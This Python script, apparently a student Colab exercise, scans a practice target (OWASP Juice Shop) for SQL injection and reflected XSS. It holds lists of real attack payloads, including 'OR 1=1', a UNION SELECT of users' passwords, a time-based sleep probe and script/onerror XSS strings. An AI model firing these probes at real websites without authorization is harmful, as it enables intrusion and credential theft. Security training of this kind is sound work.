# -*- coding: utf-8 -*-
"""NIYITEGEKA Isaie 2401000694.ipynb

Automatically generated by Colab.

Original file is located at
    https://colab.research.google.com/drive/1oxM2YmJuxBeGhiirJf5VFdX0I2-ZxTfo
"""

import requests
import time
from bs4 import BeautifulSoup

def test_sql_injection(url, payloads):
    """Tests for SQL injection vulnerabilities."""

    for payload in payloads:
        test_url = url + payload  # Construct the test URL

        try:
            response = requests.get(test_url, timeout=5)  # Send the request with a timeout
            response.raise_for_status()  # Raise an exception for bad status codes (4xx or 5xx)

            # Check for specific indicators of SQL injection in the response
            if "SQL syntax" in response.text or "error in your SQL syntax" in response.text or "ORA-" in response.text:
                print(f"4. SQL Injection detected with payload: {payload}")
                return  # Exit after finding one SQL injection

            # Check for time-based SQL injection (if the response time is unusually long)
            start_time = time.time()
            requests.get(test_url, timeout=5)  # Send the request again to measure time
            end_time = time.time()
            response_time = end_time - start_time

            if response_time > 3:  # Adjust threshold as needed
                print(f"3. Possible Time-based SQL Injection detected with payload: {payload}")
                return  # Exit after finding one time-based SQL injection

        except requests.exceptions.Timeout:
            print(f"1. Connection error or request blocked for payload: {payload}")
        except requests.exceptions.RequestException as e:
            if "WAF" in str(e).upper() or "Firewall" in str(e).upper():  # Check for WAF in exception message
                print("2. Possible Web Application Firewall (WAF) detected!")
                return  # Exit if WAF is detected
            else:
                print(f"An unexpected error occurred: {e}")

    print("5. No SQL Injection vulnerability detected")

def test_xss(url, payloads):
    """Tests for Cross-Site Scripting (XSS) vulnerabilities."""

    for payload in payloads:
        test_url = url + payload  # Construct the test URL

        try:
            response = requests.get(test_url, timeout=5)  # Send the request with a timeout
            response.raise_for_status()  # Raise an exception for bad status codes (4xx or 5xx)

            # Check if the payload is reflected in the response (a basic XSS check)
            if payload in response.text:
                print(f"XSS vulnerability detected with payload: {payload}")
                return  # Exit after finding one XSS vulnerability

        except requests.exceptions.Timeout:
            print(f"Connection error or request blocked for payload: {payload}")
        except requests.exceptions.RequestException as e:
            print(f"An unexpected error occurred: {e}")

    print("No XSS vulnerability detected")


if __name__ == "__main__":
    target_url = "https://juice-shop.herokuapp.com/#/"  # Replace with the actual target URL

    # SQL injection payloads (customize and expand as needed)
    sql_injection_payloads = [
        "?q='",
        "?q=1 OR 1=1",
        "?q=UNION SELECT user,password FROM users",  # Example, adjust for the specific database schema
        "?q=sleep(5)",  # Time-based SQL injection
        # Add more payloads here
    ]

    # XSS payloads (customize and expand as needed)
    xss_payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<a href='javascript:alert(1)'>Click me</a>",
        # Add more payloads here
    ]

    print("--- SQL Injection Test ---")
    test_sql_injection(target_url, sql_injection_payloads)

    print("\n--- XSS Test ---")
    test_xss(target_url, xss_payloads)